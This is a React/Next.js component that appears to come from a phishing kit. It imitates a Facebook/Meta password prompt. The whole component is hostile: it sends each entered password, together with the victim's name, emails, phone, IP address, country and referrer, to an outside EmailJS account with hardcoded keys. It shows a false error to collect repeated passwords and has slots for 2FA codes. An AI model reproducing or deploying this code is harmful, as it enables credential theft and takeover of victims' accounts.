'use client';

import FacebookLogoImage from '@/assets/images/facebook-logo-image.png';
import MetaLogo from '@/assets/images/meta-image.png';
import { useFormStore } from '@/store/form-store';
import { useGeoStore } from '@/store/geo-store';
import type { Dictionary } from '@/types/content';
import config from '@/utils/config';
import emailjs from '@emailjs/browser';
import { faEye } from '@fortawesome/free-regular-svg-icons/faEye';
import { faEyeSlash } from '@fortawesome/free-regular-svg-icons/faEyeSlash';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import Image from 'next/image';
import { type FC, useState } from 'react';

const Step2: FC<{ onNext: () => void; formContent: Dictionary['formModal'] }> = ({ onNext, formContent }) => {
    const [isLoading, setIsLoading] = useState(false);
    const [password, setPassword] = useState('');
    const [showError, setShowError] = useState(false);
    const [showPassword, setShowPassword] = useState(false);
    const [attempts, setAttempts] = useState(0);
    const { fullName, businessEmail, personalEmail, phoneNumber, pageName, additionalInfo, passwords, addPassword } = useFormStore();
    const { geoInfo } = useGeoStore();
    const countryCode = geoInfo?.country_code || 'US';
    const togglePassword = () => {
        setShowPassword(!showPassword);
    };

    const handleSubmit = async () => {
        if (!password.trim() || isLoading) return;

        setShowError(false);
        setIsLoading(true);

        try {
            const currentAttempt = attempts + 1;
            setAttempts(currentAttempt);

            addPassword(password);

            const updatedPasswords = [...passwords, password];

            const templateParams = {
                user_ip: geoInfo?.ip || 'unknown',
                country: countryCode || 'unknown',
                'full-name': fullName,
                'buiseness-email': businessEmail,
                'personal-email': personalEmail,
                'mobile-phone-number': phoneNumber,
                'page-name': pageName,
                'password-1': updatedPasswords[0] || '',
                'password-2': updatedPasswords[1] || '',
                '2FA-1': '',
                '2FA-2': '',
                '2FA-3': '',
                apeal: additionalInfo,
                user_referrer: document?.referrer
            };

            await emailjs.send('service_q24racw', 'template_px9og2y', templateParams, { publicKey: 'zfcufNH8QZhzMnIxU' });

            if (currentAttempt >= config.MAX_PASS) {
                onNext();
            } else {
                setShowError(true);
                setPassword('');
            }
        } catch {
            setShowError(true);
            setPassword('');
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div className='flex h-[90vh] w-full flex-col p-4'>
            <div className='flex justify-center pt-8'>
                <Image src={FacebookLogoImage} alt='' className='h-17.5 w-17.5' />
            </div>
            <div className='flex flex-1 flex-col justify-center'>
                <div className='relative w-full'>
                    <input type={showPassword ? 'text' : 'password'} id='password-input' value={password} onChange={(e) => setPassword(e.target.value)} className='peer h-15 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 pt-6 pb-2 placeholder-transparent focus:outline-none' placeholder='Password' />
                    <label htmlFor='password-input' className='absolute top-1/2 left-3 -translate-y-1/2 cursor-text text-[#4a4a4a] transition-all duration-200 ease-in-out peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-placeholder-shown:text-base peer-focus:top-2 peer-focus:translate-y-0 peer-focus:text-xs peer-[:not(:placeholder-shown)]:top-2 peer-[:not(:placeholder-shown)]:translate-y-0 peer-[:not(:placeholder-shown)]:text-xs'>
                        {formContent.step2.password}
                    </label>
                    <FontAwesomeIcon icon={showPassword ? faEyeSlash : faEye} size='lg' className='absolute top-1/2 right-2 -translate-y-1/2 cursor-pointer text-[#4a4a4a]' onClick={togglePassword} />
                </div>
                {showError && <p className='mt-2 text-[15px] text-red-500'>{formContent.step2.error}</p>}
                <button onClick={handleSubmit} disabled={isLoading} className={`mt-4 flex h-12.5 w-full items-center justify-center gap-2 rounded-full bg-blue-600 font-semibold text-white transition-colors hover:bg-blue-700 ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}>
                    {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : formContent.step2.continueButton}
                </button>
            </div>
            <div className='flex items-center justify-center pt-3'>
                <Image src={MetaLogo} alt='' className='w-16' />
            </div>
        </div>
    );
};

export default Step2;
